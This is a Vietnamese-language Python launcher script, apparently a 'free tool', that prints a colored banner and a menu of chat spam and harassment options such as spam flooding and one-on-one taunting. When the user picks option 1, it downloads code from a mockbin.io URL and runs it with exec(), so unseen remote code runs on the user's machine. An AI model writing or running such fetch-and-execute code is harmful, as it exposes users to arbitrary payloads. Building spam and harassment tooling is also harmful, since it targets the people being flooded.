import time
import os
import json
import sys
from sys import platform
from datetime import datetime
from time import sleep, strftime
import pyfiglet
import requests
from pystyle import Colorate, Colors
from pystyle import Add, Center, Anime, Colorate, Write, System
luc2='[1;32m'
tim='[1;35m'
lamd='[1;34m'
lam='[1;36m'
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb="\033[1;39m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
dev="\033[1;39m[\033[1;31m•\033[1;39m]\033[1;39m"
# Khởi tạo colorama

# Hàm tạo chữ lớn từ pyfiglet với font thẳng đứng và trả về chuỗi big text
def create_big_text(text):
    figlet = pyfiglet.Figlet(font='standard')  # Font chữ thẳng đứng
    return figlet.renderText(text)

# Hàm in chữ big text với màu gradient
def print_gradient_big_text(big_text):
    # Sử dụng Colorate.Horizontal để tạo màu gradient từ trắng sang xanh
    gradient_text = Colorate.Horizontal(Colors.red_to_black, big_text)
    print(gradient_text)

def print_gradient_big_text2(big_text):
    # Sử dụng Colorate.Horizontal để tạo màu gradient từ trắng sang xanh
    gradient_text = Colorate.Horizontal(Colors.red_to_white, big_text)
    print(gradient_text)

def print_gradient_big_text3(big_text):
    # Sử dụng Colorate.Horizontal để tạo màu gradient từ trắng sang xanh
    gradient_text = Colorate.Horizontal(Colors.yellow_to_red, big_text)
    print(gradient_text)

# Hàm chính hiển thị
def main():
    os.system('cls' if os.name == 'nt' else 'clear')  # Xóa màn hình
    print("\033[93mVui lòng chờ...\033[0m")  # In chữ màu vàng
    time.sleep(2)  # Chờ 2 giây
    os.system('cls' if os.name == 'nt' else 'clear')  # Xóa màn hình

    text = "██╗░░██╗░█████╗░██████╗░██╗░██████╗\n██║░██╔╝██╔══██╗██╔══██╗██║██╔════╝\n█████═╝░███████║██████╔╝██║╚█████╗░\n██╔═██╗░██╔══██║██╔══██╗██║░╚═══██╗\n██║░╚██╗██║░░██║██║░░██║██║██████╔╝\n╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░"  
    text2 = "         ░██╗░░░░░░░██╗░█████╗░██████╗░\n         ░██║░░██╗░░██║██╔══██╗██╔══██╗\n         ░╚██╗████╗██╔╝███████║██████╔╝\n         ░░████╔═████║░██╔══██║██╔══██╗\n         ░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║\n         ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝"
    
    thanh = "╔──────────────────── ¤ ◎ ¤ ────────────────────╗"
    gioithieu = " \033[1;39m[\033[1;32m•\033[1;39m] - © copyright by Karis  version 2.3"
    fb = f" \033[1;39m[\033[1;32m•\033[1;39m] - Admin: {Colorate.Horizontal(Colors.red_to_blue, 'fb.com/haodz.duma.210')}"
    note = " \033[1;39mNOTE: '\033[1;35mmua vps linux window ib bố nhé\n \033[1;31mfree tool rồi đú đi các con\033[1;39m'"
    thanh2 = "╚──────────────────── ¤ ◎ ¤ ────────────────────╝"
    lenh = "      \033[1;33mCó `[1;36m666\033[1;33m` lệnh mời mày sơi"
    gach = "────────────────────────────────────────────"

    # In chữ big text với màu sắc gradient
    print_gradient_big_text(text)
    print_gradient_big_text(text2)
    print_gradient_big_text2(thanh)
    print(gioithieu)
    print(fb)
    print(note)
    print_gradient_big_text2(thanh2)
    print(lenh)
    print_gradient_big_text3(gach)
    print("\033[1;39m[\033[1;31m1\033[1;39m]\033[1;39m - `\033[1;33mSpam Treo sàn tốt\033[1;39m` <\033[1;32m•\033[1;39m>")
    print("\033[1;39m[\033[1;31m2\033[1;39m]\033[1;39m - `\033[1;33mTreo Nhây bá\033[1;39m` <\033[1;32m•\033[1;39m>")
    print("\033[1;39m[\033[1;31m3\033[1;39m]\033[1;39m - `\033[1;33mtreo sớ như cc\033[1;39m` <\033[1;32m•\033[1;39m>")
    print("\033[1;39m[\033[1;31m4\033[1;39m]\033[1;39m - `\033[1;33mnhây 1-1\033[1;39m` <\033[1;32m•\033[1;39m>")
    print_gradient_big_text3(gach)
if __name__ == "__main__":
    main()
chon = int(input('\x1b[38;5;46m▶ Nhập Số \x1b[1;32m: \x1b[38;5;226m'))
if chon == 1 :
	exec(requests.get('https://5ceaa4d7986642e4a87a05b39adbdd37.api.mockbin.io/').text)
print(' Sai Lựa Chọn ')
exit()
